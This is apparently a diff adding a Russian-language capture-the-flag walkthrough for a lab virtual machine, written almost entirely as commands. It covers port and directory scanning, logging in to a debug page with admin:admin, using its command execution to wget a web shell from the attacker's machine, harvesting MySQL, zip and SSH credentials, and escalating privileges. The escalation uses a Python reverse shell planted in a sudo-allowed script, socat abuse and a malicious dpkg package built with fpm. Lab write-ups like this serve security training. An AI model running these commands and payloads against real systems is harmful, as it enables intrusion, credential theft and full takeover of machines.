@@ -1,0 +1,59 @@
+1)nmap -A  -sS -T4 -p- 192.168.225.132
+21  ftp,anon allow
+22  ssh
+80  http
+
+2)gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.132
+    /debug
+    /db.php
+
+3) заходим на /debug с данными абсолютно рандомно взятыми
+    admin:admin
+    и это подходит
+    в этой директории осуществляется удаленное выполнение команд, мы знаем что делать))
+ 
+4)
+ <on_your_machine> python3 -m http.server
+ </debug/index.php> command=wget -P /var/www/html 192.168.225.128:8000/shell.php
+
+ <on_your_machine> rlwrap nc -nlvp 1234
+ <on_browser> http://192.168.225.132/shell.php
+
+5)в файле /db.php мы находим данные для входа в mysql
+    mysql -uweb -pP@ssw0rdweb
+    use mydatabase;
+    show tables;
+    select * from creds;
+    1 | zip password | cred12345!!
+
+6) я долго думала, про какой zip файл идет речь, даже поискала по victim_machine, потом вспомнила что на ftp разрешен вход без пароля, и там обнаружила cred.zip и в ней данные для входа на ssh
+    userx:thisismypasswordforuserx2020
+
+7)sudo -l
+    (evdaez) NOPASSWD: /scripts/whatsmyid.sh
+    nano  /scripts/whatsmyid.sh
+        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.225.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+    <on_your_machine> rlwrap nc -nlvp 4444
+
+8)sudo -l
+    (researcherx) /usr/bin/socat
+    sudo -u researcherx socat stdin exec:/bin/sh
+
+9)sudo -l
+    (ALL) NOPASSWD: /usr/bin/dpkg
+
+    <on_your_machine> mktemp -d             
+        /tmp/tmp.n6OqHZsgEz
+
+    <on_your_machine> echo 'exec /bin/sh' > /tmp/tmp.n6OqHZsgEz/x.sh
+
+    <on_your_machine> fpm -n x -s dir -t deb -a all --before-install /tmp/tmp.n6OqHZsgEz/x.sh /tmp/tmp.n6OqHZsgEz
+        Created package {:path=>"x_1.0_all.deb"}
+
+    <on_your_machine> python3 -m http.server
+
+    <on_victim_machine> wget 192.168.225.128:8000/x_1.0_all.deb
+
+    <on_victim_machine> sudo -u root /usr/bin/dpkg -i x_1.0_all.deb
+    
